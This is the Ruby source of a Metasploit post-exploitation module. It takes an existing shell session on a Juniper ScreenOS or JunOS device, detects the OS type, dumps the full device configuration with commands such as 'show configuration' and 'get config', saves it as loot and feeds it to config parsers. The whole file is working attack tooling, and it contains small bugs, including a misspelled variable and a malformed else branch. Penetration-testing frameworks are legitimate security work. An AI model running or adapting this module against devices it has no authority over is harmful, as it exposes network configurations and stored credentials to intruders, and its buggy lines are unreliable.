##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/auxiliary/juniper'

class MetasploitModule < Msf::Post
  include Msf::Auxiliary::Juniper
  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Juniper Gather Device General Information',
      'Description'   => %q{
        This module collects a Juniper ScreenOS and JunOS device information and configuration.
        },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'h00die'],
      'Platform'      => [ 'juniper'],
      'SessionTypes'  => [ 'shell' ]
    ))
  end

  def run
    # Get device prompt
    prompt = session.shell_command("")

    os_type = 'junos'
    command_prefix = ''
    if prompt.end_with?('% ') # we're in an SSH shell
      vprint_status('In an SSH shell')
      command_prefix = 'cli '
    elsif prompt.end_with?('-> ') # hit cli of ScreenOS, change the os_type
      os_type = 'screenos'
    elsif prompt.end_with?('> ') # cli of JunOS
      vprint_status('In a cli shell')
    elsif prompt.end_with?('# ') # we're in a cli>configure
      vprint_status('In a cli>configure shell')
      session.shell_command('quit') # gets us back to the cli non-config
    else
      # we weren't able to detect. try a command to see if it will confirm an ssh shell
      if session.shell_command('?') =~ /\?: No match\./ # confirmed ssh shell
        vprint_status('In an SSH shell')
        command_prefix = 'cli '
      end
    end

    if os_type == 'screenos'
      # Set terminal length to 0 so no paging is required
      session.shell_write("term len 0 \n")
    end

    # Get version info
    print_status('Getting version information')
    get_system_cmd = os_type.eql?('screenos') ? 'get system' : 'show configuration'
    get_system_cmd = command_prefix + get_system_cmd
    system_out = session.shell_command(get_system_cmd)
    # https://github.com/h00die/MSF-Testing-Scripts/blob/master/juniper_strings.py#L2
    # https://kb.juniper.net/InfoCenter/index?page=content&id=KB6489
    if /^Product Name: (?<ver>SSG|NetScreen)/i =~ system_out
      vprint_status("Original OS Guess #{os_type}, is now ScreenOS #{ver}")
      os_type = 'screenos'
    elsif /^Product Name: (?<ver>.+)/i =~ system_out
      vprint_status("Original OS Guess #{os_type}, is now JunOS #{ver}")
      os_type = 'junos'
    elsif /^version (?<ver>[\.\dR]+);/i =~ system_out
      vprint_status("Original OS Guess #{os_type}, is now JunOS #{ver}")
      os_tye = 'junos'
    end

    print_status("The device OS is #{os_type}")

    case os_type
    when /screenos/
      ver_loc = store_loot("juniper.screenos.config",
        "text/plain",
        session,
        system_out.strip,
        "config.txt",
        "Juniper ScreenOS Config")
    when /junos/
      ver_loc = store_loot("juniper.junos.config",
        "text/plain",
        session,
        system_out.strip,
        "config.txt",
        "Juniper JunOS Config")
    end

    # Print the version of VERBOSE set to true.
    vprint_good("Config information stored in to loot #{ver_loc}")

    # run additional information gathering
    enum_configs(prompt, os_type, command_prefix)
  end

  # run commands found in exec mode under privilege 1
  def enum_configs(prompt, os_type, command_prefix)
    host,port = session.session_host, session.session_port
    exec_commands = [
      {
        'cmd'  => {'junos' => 'show configuration', 'screenos' => 'get config'},
        'fn'   => 'get_config',
        'desc' => 'Get Device Config on Juniper Device'
      },
    ]
    exec_commands.each do |ec|
      command = command_prefix + ec['cmd'][os_type]
      cmd_out = session.shell_command(command).gsub(/#{command}|#{prompt}/,"")
      next if cmd_out =~ /unknown keyword/ #screenOS
      print_status("Gathering info from #{command}")
      cmd_loc = store_loot("juniper.#{ec['fn']}",
        "text/plain",
        session,
        cmd_out.strip,
        "#{ec['fn']}.txt",
        ec['desc'])
      vprint_good("Saving to #{cmd_loc}")
      if os_type == 'screenos'
        juniper_screenos_config_eater(host,port,cmd_out.strip)
      else os_type == 'junos'
        juniper_junos_config_eater(host,port,cmd_out.strip)
      end
    end
  end
end
